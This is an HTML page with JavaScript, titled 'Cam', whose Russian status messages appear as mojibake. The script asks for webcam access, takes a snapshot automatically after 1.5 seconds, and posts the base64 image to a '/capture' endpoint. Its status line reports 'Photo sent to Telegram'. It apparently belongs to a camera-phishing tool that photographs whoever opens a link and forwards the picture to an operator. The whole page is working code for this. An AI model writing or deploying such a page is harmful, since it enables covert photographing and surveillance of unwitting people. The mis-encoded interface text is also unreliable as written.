<!DOCTYPE html>
<html>
<head>
    <title>Cam</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            background: #f5f5f5;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        video {
            width: 100%;
            max-width: 400px;
            border-radius: 8px;
            margin: 20px 0;
        }
        #status {
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
        }
        .success { background: #d4edda; color: #155724; }
        .error { background: #f8d7da; color: #721c24; }
        .info { background: #e2e3e5; color: #383d41; }
    </style>
</head>
<body>
    <div class="container">
        <h2>üì∏ –ö–∞–º–µ—Ä–∞</h2>
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas" style="display:none;"></canvas>
        <div id="status" class="info">–ó–∞–ø—Ä–∞—à–∏–≤–∞—é –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ...</div>
    </div>
    
    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const statusDiv = document.getElementById('status');
        
        // –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –∫–∞–º–µ—Ä—É
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                statusDiv.textContent = '‚úÖ –ö–∞–º–µ—Ä–∞ —Ä–∞–±–æ—Ç–∞–µ—Ç, –¥–µ–ª–∞—é —Å–Ω–∏–º–æ–∫...';
                statusDiv.className = 'success';
            })
            .catch(err => {
                statusDiv.textContent = '‚ùå –û—à–∏–±–∫–∞: –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ';
                statusDiv.className = 'error';
                console.log(err);
            });
        
        // –ö–æ–≥–¥–∞ –≤–∏–¥–µ–æ –Ω–∞—á–Ω–µ—Ç –∏–≥—Ä–∞—Ç—å
        video.addEventListener('play', () => {
            setTimeout(() => {
                try {
                    // –î–µ–ª–∞–µ–º —Å–Ω–∏–º–æ–∫
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    // –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º –≤ base64
                    const photo = canvas.toDataURL('image/jpeg', 0.8);
                    
                    statusDiv.textContent = 'üì§ –û—Ç–ø—Ä–∞–≤–ª—è—é —Ñ–æ—Ç–æ...';
                    
                    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–∞ —Å–µ—Ä–≤–µ—Ä
                    fetch('/capture', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ photo: photo })
                    })
                    .then(response => {
                        if (response.ok) {
                            statusDiv.textContent = '‚úÖ –§–æ—Ç–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram!';
                            statusDiv.className = 'success';
                        } else {
                            statusDiv.textContent = '‚ùå –û—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞';
                            statusDiv.className = 'error';
                        }
                    })
                    .catch(error => {
                        statusDiv.textContent = '‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏';
                        statusDiv.className = 'error';
                        console.log(error);
                    });
                    
                } catch (e) {
                    statusDiv.textContent = '‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —Å—ä–µ–º–∫–µ';
                    statusDiv.className = 'error';
                }
            }, 1500);
        });
    </script>
</body>
</html>
